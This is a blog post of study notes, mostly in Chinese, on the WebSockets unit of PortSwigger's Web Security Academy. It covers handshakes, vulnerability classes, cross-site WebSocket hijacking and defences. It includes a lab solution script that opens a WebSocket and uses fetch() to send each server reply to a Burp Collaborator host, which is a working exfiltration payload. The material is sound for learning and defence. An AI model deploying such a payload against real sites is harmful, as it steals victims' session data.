---
layout: article
title: WSAcademy 15 -- WebSockets
mathjax: true
key: a00026
cover: /bkgs/1.png
modify_date: 2021-10-19
show_author_profile: true
excerpt_type: html
tag: 
- WSAcademy
- WebSockets
mode: immersive
header:
  theme: dark
article_header:
  type: overlay
  theme: dark
  background_color: '#203028'
  background_image:
    gradient: 'linear-gradient(135deg, rgba(34, 139, 87 , .4), rgba(139, 34, 139, .4))'
    src: /docs/assets/images/cover3.jpg
---

这篇是Web Security Academy的WebSockets部分<!--more-->

原文：[WebSockets security vulnerabilities ](https://portswigger.net/web-security/websockets)

## WebSockets

WebSocket通过**HTTP**启动，并通过双向**异步**通信提供**长期**连接。

实际上，任何与常规HTTP相关的web安全漏洞也可能与WebSocket通信相关。

## What are WebSockets?

WebSocket是一种通过HTTP发起的双向全双工通信协议

WebSocket在需要**低延迟**或**服务器发起**的消息的情况下特别有用，例如金融数据的实时馈送。

## How are WebSocket connections established?

常用客户端侧的JS：

```js
var ws = new WebSocket("wss://normal-website.com/chat");
```

**Note**

- WSS：websocket with encrypted TLS connection
- WS：unencrypted connection

为了建立连接，浏览器和服务器**通过HTTP执行WebSocket握手**。浏览器发出WebSocket握手请求，如下所示：

```http
GET /chat HTTP/1.1
Host: normal-website.com
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
Connection: keep-alive, Upgrade
Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
Upgrade: websocket
```

If the server accepts the connection, it returns a WebSocket handshake response like the following:

```http
HTTP/1.1 101 Switching Protocols
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Accept: 0FFP+2nmNIf/h+4BP36k9uzrYGk=
```

此时连接持续开启，双方都能发送WebSocket消息

**Note**

Several features of the WebSocket handshake messages are worth noting:

请求和响应中的`Connection` and `Upgrade`标头表明这是WebSocket握手。

`Sec-WebSocket-Version`请求标头指定客户端希望使用的WebSocket协议版本。这通常是13。

`Sec-WebSocket-Key`请求标头包含Base64编码的随机值，该值应在每次握手请求中随机生成。

`Sec-WebSocket-Accept` response标头包含`Sec-WebSocket-Key`请求标头中提交的值的散列，并与协议规范中定义的特定字符串连接。这样做是为了防止错误配置的服务器或缓存代理导致误导性响应。

## Manipulating WebSocket traffic

You can use Burp Suite to Intercept and modify WebSocket messages and Replay and generate new WebSocket messages and Manipulate WebSocket connections.

## WebSockets security vulnerabilities

In principle, practically any web security vulnerability might arise in relation to WebSockets:

- **SQLi**
- Some **blind vulnerabilities using OAST** 
- might lead to **XSS or other client-side vulnerabilities**

### Manipulating WebSocket messages to exploit vulnerabilities

XSS for example

### Manipulating the WebSocket handshake to exploit vulnerabilities

这些漏洞往往涉及设计缺陷，例如：

- 错误信任HTTP头以执行安全决策

  例如X-Forwarded-For。

- 会话处理机制中的缺陷

  因为处理WebSocket消息的会话上下文通常由握手消息的会话上下文决定。

- 应用程序使用的自定义HTTP头引入的攻击面。

### Cross-site WebSocket hijacking

当攻击者从其控制的网站建立**跨域WebSocket连接时**，会出现一些WebSocket安全漏洞

跨站点WebSocket劫持（CSWSH，也称为 cross-origin WebSocket hijacking）涉及WebSocket握手上的跨站点请求伪造（CSRF）漏洞

当WebSocket握手请求**仅依赖HTTP cookie**进行会话处理，并且**不包含任何CSRF令牌或其他不可预测的值**时，就会出现这种情况。



攻击者可以在自己的域上创建恶意网页，从而建立到易受攻击应用程序的跨站点WebSocket连接。应用程序将在受害用户与应用程序的会话上下文中处理连接。

然后，攻击者的页面可以通过连接向服务器发送任意消息，并读取从服务器接收回来的消息内容。这意味着，与常规CSRF不同，攻击者获得与被渗透应用程序的双向交互。

#### What is the impact of cross-site WebSocket hijacking?

- 伪装成受害者用户执行未经授权的操作

- 检索用户可以访问的敏感数据

#### Performing a cross-site WebSocket hijacking attack

由于这是CSRF攻击，首先要检查他们是否受到CSRF保护。

通常需要找到一条握手消息，该消息**仅依赖HTTP cookies进行会话处理**，并且在请求参数中不使用任何令牌或其他不可预测的值。

例如，以下WebSocket握手请求可能易受CSRF攻击，唯一的会话令牌在cookie中传输：

```http
GET /chat HTTP/1.1
Host: normal-website.com
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
Connection: keep-alive, Upgrade
Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
Upgrade: websocket
```

`Sec-WebSocket-Key`头包含一个随机值，用于防止缓存代理时出错，而不是用于保护

```js
lab：
<script>
websocket = new WebSocket('wss://ac851f5a1e6993ab80b247aa00000082.web-security-academy.net/chat')
websocket.onopen = start
websocket.onmessage = handleReply
function start(event) {
websocket.send("READY");
}
function handleReply(event) {
fetch('https://pa3vo56qx2kjqo6lx5ii1mprjip8dx.burpcollaborator.net/?'+event.data, {mode: 'no-cors'})
}
</script>
```

#### How to secure a WebSocket connection

- 使用wss://协议（TLS上的WebSocket）。

- **硬编码**WebSockets端点的**URL**，当然不要将用户可控制的数据合并到此URL中。
- 针对**CSRF**保护WebSocket握手消息，以避免跨站点WebSocket劫持漏洞。

- **将通过WebSocket接收的数据视为双向不可信**。在服务器端和客户端安全地处理数据，以防止基于输入的漏洞，如SQL注入和跨站点脚本。

![2](/pics/WSA/2.jpg)

